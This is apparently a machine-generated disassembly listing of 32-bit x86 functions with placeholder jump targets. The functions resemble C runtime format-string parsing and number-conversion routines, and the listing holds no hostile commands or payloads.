or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d551
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d59d
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d635
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov bl [ eax ]
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al bl
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
inc ecx
pop ebx
pop ebp
retn
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x65
je r-xdata
mov edx ecx
cmp al 0x45
je r-xdata
dec ecx
cmp [ ecx ] 0x30
je r-xdata
cmp [ ecx ] bl
jne r-xdata
inc ecx
mov al [ edx ]
inc ecx
inc edx
mov [ ecx ] al
test al al
jne r-xdata
dec ecx
sub_41d68c
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d6c1
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d6f6
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor ecx ecx
movsx eax cl
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d728
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d75d
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d792
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor ecx ecx
movsx eax cl
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d7c4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d7fb
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d832
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor ecx ecx
movzx eax cx
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d866
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d89d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d8d4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor ecx ecx
movzx eax cx
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d908
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_4338a2
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_4333e6
test eax eax
movsx eax [ esi ]
push eax
call sub_4338a2
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp + 0xc ]
mov cl [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
pop ebp
retn
sub_41dae0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov cl [ esi + 0x4 ]
cmp cl 0x70
mov [ ebp - 0x8 ] ecx
sete dh
cmp bl 0x70
sete dl
test dh dh
jne r-xdata
xor eax eax
cmp dh dl
test dl dl
jne r-xdata
xor eax eax
cmp cl 0x73
je r-xdata
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x1 ] al
cmp cl 0x53
jne r-xdata
mov dh 0x1
mov dh al
cmp bl 0x53
jne r-xdata
cmp bl 0x73
je r-xdata
mov dl 0x1
mov dl al
cmp cl 0x43
jne r-xdata
cmp cl 0x63
je r-xdata
mov al 0x1
cmp bl 0x43
jne r-xdata
cmp bl 0x63
je r-xdata
cmp [ ebp - 0x1 ] dh
jne r-xdata
test dh dh
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp dl al
jne r-xdata
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push ebx
push [ edi + 0x4 ]
push [ edi ]
call sub_41b585
push [ esi + 0xc ]
mov bl al
push [ ebp - 0x8 ]
push [ edi + 0x4 ]
push [ edi ]
call sub_41b585
add esp 0x20
cmp al bl
sete al
jmp r-xdata
test al al
jne r-xdata
push ecx
call sub_41b407
push ebx
mov [ ebp - 0x1 ] al
call sub_41b407
pop ecx
pop ecx
mov cl [ ebp - 0x1 ]
test cl cl
jne r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_4230ce
push [ ebp + 0x14 ]
mov ebx eax
call sub_4230ce
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41dc0e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov cl [ esi + 0x4 ]
cmp cl 0x70
mov [ ebp - 0x8 ] ecx
sete dh
cmp bl 0x70
sete dl
test dh dh
jne r-xdata
xor eax eax
cmp dh dl
test dl dl
jne r-xdata
xor eax eax
cmp cl 0x73
je r-xdata
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x1 ] al
cmp cl 0x53
jne r-xdata
mov dh 0x1
mov dh al
cmp bl 0x53
jne r-xdata
cmp bl 0x73
je r-xdata
mov dl 0x1
mov dl al
cmp cl 0x43
jne r-xdata
cmp cl 0x63
je r-xdata
mov al 0x1
cmp bl 0x43
jne r-xdata
cmp bl 0x63
je r-xdata
cmp [ ebp - 0x1 ] dh
jne r-xdata
test dh dh
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp dl al
jne r-xdata
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push ebx
push [ edi + 0x4 ]
push [ edi ]
call sub_41b585
push [ esi + 0xc ]
mov bl al
push [ ebp - 0x8 ]
push [ edi + 0x4 ]
push [ edi ]
call sub_41b585
add esp 0x20
cmp al bl
sete al
jmp r-xdata
test al al
jne r-xdata
push ecx
call sub_41b434
push ebx
mov [ ebp - 0x1 ] al
call sub_41b434
pop ecx
pop ecx
mov cl [ ebp - 0x1 ]
test cl cl
jne r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_4230ce
push [ ebp + 0x14 ]
mov ebx eax
call sub_4230ce
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41dd3c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x70
pop eax
movzx edi [ esi + 0x4 ]
cmp di ax
mov [ ebp - 0x8 ] ecx
sete dl
cmp bx ax
sete cl
test dl dl
jne r-xdata
xor eax eax
cmp dl cl
test cl cl
jne r-xdata
push edi
call sub_41b54d
push ebx
mov [ ebp - 0x3 ] al
call sub_41b54d
push edi
mov [ ebp - 0x1 ] al
call sub_41b3cf
push ebx
mov [ ebp - 0x2 ] al
call sub_41b3cf
mov cl [ ebp - 0x3 ]
add esp 0x10
test cl cl
jne r-xdata
cmp cl [ ebp - 0x1 ]
jne r-xdata
cmp [ ebp - 0x1 ] cl
jne r-xdata
xor al al
jmp r-xdata
mov cl [ ebp - 0x2 ]
mov cl [ ebp - 0x2 ]
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b5c5
push [ esi + 0xc ]
mov bl al
mov eax [ ebp - 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41b5c5
add esp 0x20
cmp al bl
sete al
jmp r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
push edi
call sub_41b461
push [ ebp + 0x10 ]
mov bl al
call sub_41b461
pop ecx
pop ecx
test bl bl
jne r-xdata
cmp bl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_4230ce
push [ ebp + 0x14 ]
mov ebx eax
call sub_4230ce
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41de5f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x70
pop eax
movzx edi [ esi + 0x4 ]
cmp di ax
mov [ ebp - 0x8 ] ecx
sete dl
cmp bx ax
sete cl
test dl dl
jne r-xdata
xor eax eax
cmp dl cl
test cl cl
jne r-xdata
push edi
call sub_41b569
push ebx
mov [ ebp - 0x3 ] al
call sub_41b569
push edi
mov [ ebp - 0x1 ] al
call sub_41b3eb
push ebx
mov [ ebp - 0x2 ] al
call sub_41b3eb
mov cl [ ebp - 0x3 ]
add esp 0x10
test cl cl
jne r-xdata
cmp cl [ ebp - 0x1 ]
jne r-xdata
cmp [ ebp - 0x1 ] cl
jne r-xdata
xor al al
jmp r-xdata
mov cl [ ebp - 0x2 ]
mov cl [ ebp - 0x2 ]
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b5c5
push [ esi + 0xc ]
mov bl al
mov eax [ ebp - 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41b5c5
add esp 0x20
cmp al bl
sete al
jmp r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
push edi
call sub_41b49d
push [ ebp + 0x10 ]
mov bl al
call sub_41b49d
pop ecx
pop ecx
test bl bl
jne r-xdata
cmp bl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_4230ce
push [ ebp + 0x14 ]
mov ebx eax
call sub_4230ce
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41dfca
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_433e4c
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e026
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_433e4c
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e082
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_433e4c
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e0de
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_433e4c
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e13a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_433e4c
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e196
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_433e4c
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e1f2
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_433f54
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e250
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_433f54
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e2ae
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_433f54
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e30c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_433f54
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e36a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_433f54
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e3c8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_433f54
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e426
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4278e4
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427e86
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d68c
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e52e ]
mov ecx esi
call sub_41f822
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f546
jmp r-xdata
mov ecx esi
call sub_422e20
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ff18
jmp r-xdata
mov ecx esi
call sub_420146
jmp r-xdata
mov ecx esi
call sub_4212a4
test al al
je r-xdata
sub_41e54e
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4278e4
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d4b9
test al al
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427f0e
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d6c1
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_427a86
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d4b9
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e68a ]
mov ecx esi
call sub_41f841
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f583
jmp r-xdata
mov ecx esi
call sub_422e4b
jmp r-xdata
